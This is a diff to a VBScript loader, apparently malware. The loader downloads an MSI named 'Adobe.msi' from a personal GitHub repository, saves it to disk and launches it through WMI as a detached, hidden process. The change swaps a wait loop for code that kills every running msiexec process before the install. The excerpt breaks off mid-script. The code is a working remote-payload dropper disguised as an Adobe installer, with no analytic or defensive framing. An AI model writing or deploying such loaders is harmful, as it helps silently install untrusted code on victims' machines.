@@ -1,4 +1,4 @@
-Dim fso, sh, http, msiUrl, msiPath, pid, wmiSvc, procClass, startup, cmdLine, procs, proc
+Dim fso, sh, http, msiUrl, msiPath, pid, wmiSvc, procClass, startup, cmdLine, procs, proc, stream
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set sh  = CreateObject("WScript.Shell")
 msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
@@ -9,7 +9,6 @@ http.Open "GET", msiUrl, False
 http.Send
 
 If http.Status = 200 Then
-    Dim stream
     Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1
     stream.Open
@@ -19,23 +18,17 @@ If http.Status = 200 Then
 End If
 
 If fso.FileExists(msiPath) Then
-    ' wait for any in-flight msiexec to finish (up to 60s)
-    Dim waited
-    waited = 0
-    Do While waited < 60
-        Dim anyRunning
-        anyRunning = False
-        Set wmiSvc = GetObject("winmgmts:\\.\root\cimv2")
-        Set procs = wmiSvc.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='msiexec.exe'")
-        For Each proc In procs
-            anyRunning = True
-        Next
-        If Not anyRunning Then Exit Do
-        WScript.Sleep 2000
-        waited = waited + 2
-    Loop
+    ' kill any hung msiexec before installing
+    Set wmiSvc = GetObject("winmgmts:\\.\root\cimv2")
+    Set procs = wmiSvc.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='msiexec.exe'")
+    For Each proc In procs
+        proc.Terminate
+    Next
 
-    ' spawn new install via WMI, detached
+    ' brief wait so the mutex releases
+    WScript.Sleep 3000
+
+    ' spawn the new install via WMI, detached, hidden
     Set wmiSvc    = GetObject("winmgmts:\\.\root\cimv2")
     Set procClass = wmiSvc.Get("Win32_Process")
     Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
